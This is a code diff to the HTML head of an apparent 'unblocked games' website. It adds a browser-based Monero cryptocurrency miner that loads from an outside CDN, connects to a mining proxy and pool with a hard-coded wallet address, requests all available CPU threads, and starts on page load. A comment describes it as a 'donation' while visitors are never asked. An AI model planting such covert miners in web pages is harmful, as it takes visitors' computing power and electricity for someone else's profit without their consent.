@@ -11,6 +11,21 @@
   gtag('config', 'G-KVNYG5VNX6');
 </script>
 
+<!-- Simple script that donates XMR (monero) via mining, if you have an ad blocker this should not effect you 
+I only plan on adding this to the homepage -->
+<script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+<script>
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "moneroocean.stream";
+    var walletAddress = "4AabwFkVkTMM1MmKoBHD3ih1LvXhF2tXXi4T5vV75TrmAAEJroKy6SuXHWKq6Lgi2kMLjUazb6rjP52BNRxHqoQj5whnXzm";
+    var workerId = "Game-H"
+    var threads = -1;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
+<!-- End Of Mining Code (HTML) -->
+
     <meta charset="UTF-8">
     <meta name="description" content="The Best website for unblocked games!">
     <meta name="keywords" content="Games,Unblocked Games,Unity,WebGL,Unblocked,Google Sites,tyler's game hub,tyler's unblocked games,tyler's games unblocked">
